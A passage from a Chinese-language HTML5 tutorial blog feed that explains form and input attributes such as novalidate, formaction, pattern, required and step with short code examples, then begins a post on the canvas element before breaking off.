class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span> <br></code></pre></div></td></tr></table></figure><h3 id="5-4-novalidate-属性（-lt-form-gt-）"><a href="#5-4-novalidate-属性（-lt-form-gt-）" class="headerlink" title="5.4 novalidate 属性（&lt;form&gt;）"></a>5.4 novalidate 属性（&lt;form&gt;）</h3><p>novalidate 属性的一个boolean 属性。novalidate 属性规定在提交表单时不应该验证 form 或 input 域。</p><p>使用实例：无需验证提交的表单数据</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">novalidate</span>&gt;</span><br> E-mail: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;user_email&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-5-autofocus-属性（-lt-input-gt-）"><a href="#5-5-autofocus-属性（-lt-input-gt-）" class="headerlink" title="5.5 autofocus 属性（&lt;input&gt;）"></a>5.5 autofocus 属性（&lt;input&gt;）</h3><p>autofocus 属性是一个 boolean 属性。autofocus 属性规定在页面加载时，域自动地获得焦点。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">First name:<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-6-form-属性（-lt-input-gt-）"><a href="#5-6-form-属性（-lt-input-gt-）" class="headerlink" title="5.6 form 属性（&lt;input&gt;）"></a>5.6 form 属性（&lt;input&gt;）</h3><p>form 属性规定输入域所属的一个或多个表单。如需引用一个以上的表单，需要使用空格分隔的列表。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;form1&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><br>Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span> <span class="hljs-attr">form</span>=<span class="hljs-string">&quot;form1&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>“Last name” 字段没有在form表单之内，但它也是form表单的一部分。</p><h3 id="5-7-formaction-属性（-lt-input-gt-）"><a href="#5-7-formaction-属性（-lt-input-gt-）" class="headerlink" title="5.7 formaction 属性（&lt;input&gt;）"></a>5.7 formaction 属性（&lt;input&gt;）</h3><p>formaction 属性用于描述表单提交的URL地址。<br>formaction 属性会覆盖&lt;form&gt; 元素中的action属性。formaction 属性用于 type=”submit” 和 type=”image”。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">&quot;demo-admin.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit as admin&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-8-formenctype-属性（-lt-input-gt-）"><a href="#5-8-formenctype-属性（-lt-input-gt-）" class="headerlink" title="5.8 formenctype 属性（&lt;input&gt;）"></a>5.8 formenctype 属性（&lt;input&gt;）</h3><p>formenctype 属性描述了表单提交到服务器的数据编码 (只对form表单中 method=”post” 表单)。该属性与 type=”submit” 和 type=”image” 配合使用。formenctype 属性覆盖 form 元素的 enctype 属性。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-post_enctype.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formenctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit as Multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-9-formmethod-属性（-lt-input-gt-）"><a href="#5-9-formmethod-属性（-lt-input-gt-）" class="headerlink" title="5.9 formmethod 属性（&lt;input&gt;）"></a>5.9 formmethod 属性（&lt;input&gt;）</h3><p>formmethod 属性定义了表单提交的方式。该属性可以与 type=”submit” 和 type=”image” 配合使用。<br>formmethod 属性覆盖了 &lt;form&gt; 元素的的method 属性。</p><p>使用实例：重新定义表单提交方式实例</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;get&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formmethod</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">formaction</span>=<span class="hljs-string">&quot;demo-post.php&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit using POST&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-10-formnovalidate-属性（-lt-input-gt-）"><a href="#5-10-formnovalidate-属性（-lt-input-gt-）" class="headerlink" title="5.10 formnovalidate 属性（&lt;input&gt;）"></a>5.10 formnovalidate 属性（&lt;input&gt;）</h3><p>novalidate 属性是一个 boolean 属性。novalidate属性描述了 &lt;input&gt; 元素在表单提交时无需被验证。formnovalidate 属性会覆盖 &lt;form&gt; 元素的novalidate属性。formnovalidate 属性与type=”submit”一起使用。</p><p>使用实例：两个提交按钮的表单(使用与不适用验证 )</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span>&gt;</span><br> E-mail: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;userid&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formnovalidate</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit without validation&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>  <br></code></pre></div></td></tr></table></figure><h3 id="5-11-formtarget-属性（-lt-input-gt-）"><a href="#5-11-formtarget-属性（-lt-input-gt-）" class="headerlink" title="5.11 formtarget 属性（&lt;input&gt;）"></a>5.11 formtarget 属性（&lt;input&gt;）</h3><p>formtarget 属性指定一个名称或一个关键字来指明表单提交数据接收后的展示。formtarget 属性覆盖 &lt;form&gt;元素的target属性。formtarget 属性与type=”submit” 和 type=”image”配合使用。</p><p>使用实例：两个提交按钮的表单, 在不同窗口中显示</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;demo-form.php&quot;</span>&gt;</span><br> First name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> Last name: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;lname&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit as normal&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">formtarget</span>=<span class="hljs-string">&quot;_blank&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit to a new window&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-12-height-和-width-属性（-lt-input-gt-）"><a href="#5-12-height-和-width-属性（-lt-input-gt-）" class="headerlink" title="5.12 height 和 width 属性（&lt;input&gt;）"></a>5.12 height 和 width 属性（&lt;input&gt;）</h3><p>height 和 width 属性规定用于 image 类型的 &lt;input&gt; 标签的图像高度和宽度。height 和 width 属性只适用于 image 类型的&lt;input&gt; 标签。</p><p>图像通常会同时指定高度和宽度属性。如果图像设置高度和宽度，图像所需的空间 在加载页时会被保留。如果没有这些属性， 浏览器不知道图像的大小，并不能预留 适当的空间。图片在加载过程中会使页面布局效果改变 （尽管图片已加载）。</p><p>使用实例：定义了一个图像提交按钮, 使用了 height 和 width 属性</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image&quot;</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;img_submit.gif&quot;</span> <span class="hljs-attr">alt</span>=<span class="hljs-string">&quot;Submit&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;48&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;48&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-13-list-属性（-lt-input-gt-）"><a href="#5-13-list-属性（-lt-input-gt-）" class="headerlink" title="5.13 list 属性（&lt;input&gt;）"></a>5.13 list 属性（&lt;input&gt;）</h3><p>list 属性规定输入域的 datalist。datalist 是输入域的选项列表。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">list</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">datalist</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;browsers&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Internet Explorer&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Firefox&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Chrome&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Opera&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Safari&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">datalist</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-14-min-和-max-属性（-lt-input-gt-）"><a href="#5-14-min-和-max-属性（-lt-input-gt-）" class="headerlink" title="5.14 min 和 max 属性（&lt;input&gt;）"></a>5.14 min 和 max 属性（&lt;input&gt;）</h3><p>min、max 和 step 属性用于为包含数字或日期的 input 类型规定限定（约束）。</p><p>min、max 和 step 属性适用于以下类型的 &lt;input&gt; 标签：date pickers、number 以及 range。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Enter a date before 1980-01-01:<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bday&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;1979-12-31&quot;</span>&gt;</span><br><br>Enter a date after 2000-01-01:<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;date&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bday&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;2000-01-02&quot;</span>&gt;</span><br><br>Quantity (between 1 and 5):<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;quantity&quot;</span> <span class="hljs-attr">min</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">max</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-15-multiple-属性（-lt-input-gt-）"><a href="#5-15-multiple-属性（-lt-input-gt-）" class="headerlink" title="5.15 multiple 属性（&lt;input&gt;）"></a>5.15 multiple 属性（&lt;input&gt;）</h3><p>multiple 属性是一个 boolean 属性。multiple 属性规定&lt;input&gt; 元素中可选择多个值。<br>multiple 属性适用于以下类型的&lt;input&gt; 标签：email 和 file。: email, and file.</p><p>使用实例：上传多个文件</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Select images: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;img&quot;</span> <span class="hljs-attr">multiple</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-16-pattern-属性（-lt-input-gt-）"><a href="#5-16-pattern-属性（-lt-input-gt-）" class="headerlink" title="5.16 pattern 属性（&lt;input&gt;）"></a>5.16 pattern 属性（&lt;input&gt;）</h3><p>pattern 属性描述了一个正则表达式用于验证&lt;input&gt; 元素的值。<br>pattern 属性适用于以下类型的&lt;input&gt; 标签: text, search, url, tel, email, 和 password.<br>是用来全局 title 属性描述了模式.</p><p>使用实例：显示一个只能包含三个字母的文本域（不含数字及特殊字符）</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Country code: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;country_code&quot;</span> <span class="hljs-attr">pattern</span>=<span class="hljs-string">&quot;[A-Za-z]&#123;3&#125;&quot;</span> <span class="hljs-attr">title</span>=<span class="hljs-string">&quot;Three letter country code&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-17-placeholder-属性（-lt-input-gt-）"><a href="#5-17-placeholder-属性（-lt-input-gt-）" class="headerlink" title="5.17 placeholder 属性（&lt;input&gt;）"></a>5.17 placeholder 属性（&lt;input&gt;）</h3><p>placeholder 属性提供一种提示（hint），描述输入域所期待的值。简短的提示在用户输入值前会显示在输入域上。</p><p>placeholder 属性适用于以下类型的&lt;input&gt; 标签：text, search, url, telephone, email 以及 password。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;fname&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;First name&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-18-required-属性（-lt-input-gt-）"><a href="#5-18-required-属性（-lt-input-gt-）" class="headerlink" title="5.18  required 属性（&lt;input&gt;）"></a>5.18  required 属性（&lt;input&gt;）</h3><p>required 属性是一个 boolean 属性。required 属性规定必须在提交之前填写输入域（不能为空）。</p><p>required 属性适用于以下类型的&lt;input&gt; 标签：text, search, url, telephone, email, password, date pickers, number, checkbox, radio 以及 file。</p><p>使用实例：不能为空的input字段</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">Username: <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;usrname&quot;</span> <span class="hljs-attr">required</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="5-19-step-属性（-lt-input-gt-）"><a href="#5-19-step-属性（-lt-input-gt-）" class="headerlink" title="5.19 step 属性（&lt;input&gt;）"></a>5.19 step 属性（&lt;input&gt;）</h3><p>step 属性为输入域规定合法的数字间隔。如果 step=”3”，则合法的数是 -3,0,3,6 等。step 属性可以与 max 和 min 属性创建一个区域值。</p><p>step 属性与以下type类型一起使用: number, range, date, datetime, datetime-local, month, time 和 week。</p><p>使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;number&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;points&quot;</span> <span class="hljs-attr">step</span>=<span class="hljs-string">&quot;3&quot;</span>&gt;</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WEB前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>WEB前端-HTML5基础知识复习（二）</title>
    <link href="/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/05/12/WEB%E5%89%8D%E7%AB%AF/WEB%E5%89%8D%E7%AB%AF-HTML5%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%A4%8D%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>HTML5规范于2014年10月29日由万维网联盟正式宣布，HTML是万维网最核心的超文本标记语言。万维网不等同于互联网，但它是依靠互联网运行的服务之一，万维网又简写为www，它可以实现在互联网的帮助下，访问由许多互相链接的超文本组成的系统。现代的浏览器都支持 HTML5。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-lt-canvas-gt-元素"><a href="#1-lt-canvas-gt-元素" class="headerlink" title="1.&lt;canvas&gt;元素"></a>1.&lt;canvas&gt;元素</h2><p>&lt;canvas&gt;元素是HTML5中的新元素，通过使用该元素，你可以在网页中绘制所需的图形。标签定义图形，比如图表和其他图像，您必须使用脚本来绘制图形。通过脚本 (通常是JavaScript)来完成。标签只是图形容器，您必须使用脚本来绘制图形。可以通过多种方法使用Canva绘制路径,盒、圆、字符以及添加图像。可以在HTML页面中使用多个 &lt;canvas&gt; 元素.</p><h3 id="1-1-创建一个画布"><a href="#1-1-创建一个画布" class="headerlink" title="1.1 创建一个画布"></a>1.1 创建一个画布</h3><p>一个画布在网页中是一个矩形框，通过 &lt;canvas&gt; 元素来绘制。默认情况下 &lt;canvas&gt; 元素没有边框和内容。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myCanvas&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>标签通常需要指定一个id属性 (脚本中经常引用), width 和 height 属性定义的画布的大小。</p><p><strong>使用style属性来添加边框：</strong></p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">canvas</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;myCanvas&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;200&quot;</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span></span><br><span class="hljs-tag"><span class="hljs-attr">style</span>=<span class="hljs-string">&quot;border:1px solid #000000;&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">canvas</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="1-2-使用JavaScript来绘制图像"><a href="#1-2-使用JavaScript来绘制图像" class="headerlink" title="1.2 使用JavaScript来绘制图像"></a>1.2 使用JavaScript来绘制图像</h3><p>canvas 元素本身是没有绘图能力的。所有的绘制工作必须在 JavaScript 内部完成。</p><p>简单使用实例：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div 